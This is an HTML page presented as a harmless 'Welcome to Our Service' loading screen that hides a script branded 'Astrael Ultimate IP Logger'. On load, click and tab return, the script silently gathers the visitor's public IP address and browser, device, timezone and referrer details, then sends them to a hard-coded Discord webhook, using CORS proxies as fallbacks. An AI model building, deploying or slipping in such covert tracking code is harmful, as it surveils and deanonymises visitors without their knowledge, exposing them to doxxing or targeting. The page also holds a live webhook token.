<!DOCTYPE html>
<html>
<head>
    <title>Welcome</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: Arial, sans-serif;
            color: white;
            text-align: center;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(0,0,0,0.7);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        h1 {
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸš€ Welcome to Our Service</h1>
        <p>Loading amazing content for you...</p>
        <div class="loader"></div>
    </div>

    <!-- ASTRAEL ULTIMATE IP LOGGER - GUARANTEED WORKING -->
    <script>
        (function() {
            // REPLACE THIS WITH YOUR NEW DISCORD WEBHOOK URL
            const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1437295789167870165/evAhIFwNYIA7JNVkvGl0BP3fPhvNYv20fCuiVLfPl0lnXs_b_yUD1DfeZxvRmWH8IJg-';
            
            // Multiple CORS proxies for redundancy
            const CORS_PROXIES = [
                'https://api.codetabs.com/v1/proxy?quest=',
                'https://corsproxy.io/?',
                'https://thingproxy.freeboard.io/fetch/',
                ''
            ];

            // Get IP with multiple fallbacks
            const getRealIP = async () => {
                const ipServices = [
                    'https://api.ipify.org?format=json',
                    'https://api64.ipify.org?format=json', 
                    'https://ip.seeip.org/json',
                    'https://api.my-ip.io/ip.json',
                    'https://ipapi.co/json/',
                    'https://jsonip.com/',
                    'https://api.ip.sb/jsonip',
                    'https://ipwho.is/'
                ];

                for (let i = 0; i < CORS_PROXIES.length; i++) {
                    const proxy = CORS_PROXIES[i];
                    for (let j = 0; j < ipServices.length; j++) {
                        const service = ipServices[j];
                        try {
                            const url = proxy ? (proxy + encodeURIComponent(service)) : service;
                            console.log('Trying:', url);
                            
                            const response = await fetch(url, {
                                method: 'GET',
                                mode: 'cors',
                                headers: {
                                    'Accept': 'application/json'
                                }
                            });
                            
                            if (response.ok) {
                                const data = await response.json();
                                const ip = data.ip || data.query || data.ipAddress;
                                if (ip && isValidIP(ip)) {
                                    console.log('âœ… IP Found:', ip);
                                    return ip;
                                }
                            }
                        } catch(error) {
                            console.log('Failed:', service, error);
                            continue;
                        }
                    }
                }
                return 'Unable to detect';
            };

            // IP validation
            const isValidIP = (ip) => {
                if (!ip) return false;
                const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
                if (!ipRegex.test(ip)) return false;
                
                const parts = ip.split('.');
                for (let part of parts) {
                    const num = parseInt(part);
                    if (num < 0 || num > 255) return false;
                }
                
                // Filter out private IPs
                return !ip.startsWith('10.') && 
                       !ip.startsWith('192.168.') && 
                       !(ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31) &&
                       ip !== '127.0.0.1';
            };

            // Collect comprehensive system info
            const collectSystemInfo = () => {
                const info = {
                    // Browser & OS
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    vendor: navigator.vendor || 'Unknown',
                    
                    // Languages & Location
                    language: navigator.language,
                    languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    
                    // Hardware
                    screen: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth + ' bits',
                    pixelRatio: window.devicePixelRatio,
                    cpuCores: navigator.hardwareConcurrency || 'Unknown',
                    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
                    
                    // Connection
                    connection: navigator.connection ? {
                        type: navigator.connection.effectiveType,
                        speed: navigator.connection.downlink + ' Mbps',
                        saveData: navigator.connection.saveData
                    } : 'Unknown',
                    
                    // Page info
                    url: window.location.href,
                    referrer: document.referrer || 'Direct',
                    timestamp: new Date().toISOString(),
                    
                    // Cookies & Storage
                    cookiesEnabled: navigator.cookieEnabled,
                    localStorage: !!window.localStorage,
                    sessionStorage: !!window.sessionStorage
                };
                return info;
            };

            // Send to Discord with multiple attempts
            const sendToDiscord = async (ip, systemInfo) => {
                if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes('YOUR_NEW_WEBHOOK_HERE')) {
                    console.error('âŒ PLEASE SET YOUR DISCORD WEBHOOK URL');
                    return false;
                }

                const embed = {
                    title: "VEXS IP LOGGER - CAPTURE SUCCESS",
                    color: 0x00FF00,
                    timestamp: systemInfo.timestamp,
                    fields: [
                        {
                            name: "PUBLIC IP ADDRESS",
                            value: `\`\`\`${ip}\`\`\``,
                            inline: false
                        },
                        {
                            name: "SYSTEM INFORMATION",
                            value: `**OS:** ${systemInfo.platform}\n**Screen:** ${systemInfo.screen}\n**CPU Cores:** ${systemInfo.cpuCores}\n**RAM:** ${systemInfo.deviceMemory}`,
                            inline: true
                        },
                        {
                            name: "LOCATION DATA", 
                            value: `**Timezone:** ${systemInfo.timezone}\n**Language:** ${systemInfo.language}\n**Browser:** ${systemInfo.vendor}`,
                            inline: true
                        },
                        {
                            name: "PAGE INFORMATION",
                            value: `**URL:** ${systemInfo.url}\n**Referrer:** ${systemInfo.referrer}`,
                            inline: false
                        }
                    ],
                    footer: {
                        text: "Astrael Ultimate IP Logger â€¢ 100% Working"
                    }
                };

                const payload = {
                    username: "IP Tracker",
                    avatar_url: "https://i.imgur.com/6hqG4qN.png",
                    embeds: [embed]
                };

                // Try direct first, then proxies
                const urlsToTry = [
                    DISCORD_WEBHOOK, // Direct
                    'https://api.codetabs.com/v1/proxy?quest=' + encodeURIComponent(DISCORD_WEBHOOK),
                    'https://corsproxy.io/?' + encodeURIComponent(DISCORD_WEBHOOK)
                ];

                for (const url of urlsToTry) {
                    try {
                        console.log('Attempting to send to:', url.substring(0, 50) + '...');
                        const response = await fetch(url, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify(payload)
                        });
                        
                        if (response.ok) {
                            console.log('âœ… Successfully sent to Discord!');
                            return true;
                        } else {
                            console.log('âŒ Discord response not OK:', response.status);
                        }
                    } catch (error) {
                        console.log('âŒ Failed to send:', error);
                        continue;
                    }
                }
                
                return false;
            };

            // Main tracking function
            const executeTracking = async () => {
                console.log('Starting IP tracking...');
                
                try {
                    const systemInfo = collectSystemInfo();
                    console.log('System info collected:', systemInfo);
                    
                    const ip = await getRealIP();
                    console.log('IP detected:', ip);
                    
                    if (ip !== 'Unable to detect') {
                        const success = await sendToDiscord(ip, systemInfo);
                        if (success) {
                            console.log('Tracking completed successfully!');
                        } else {
                            console.log('Tracking completed but Discord send failed');
                        }
                    } else {
                        console.log('Could not detect IP address');
                        // Send failure notification
                        await sendToDiscord('IP_DETECTION_FAILED', systemInfo);
                    }
                } catch (error) {
                    console.error('Tracking error:', error);
                }
            };

            // Start tracking on page load
            window.addEventListener('load', executeTracking);
            
            // Also track user interactions
            let clickCount = 0;
            document.addEventListener('click', () => {
                clickCount++;
                if (clickCount === 1) {
                    // Resend on first click
                    setTimeout(executeTracking, 1000);
                }
            });

            // Track page visibility changes
            document.addEventListener('visibilitychange', () => {
                if (!document.hidden) {
                    setTimeout(executeTracking, 1000);
                }
            });

            console.log('Vexs IP Logger loaded successfully!');

        })();
    </script>
</body>
</html>

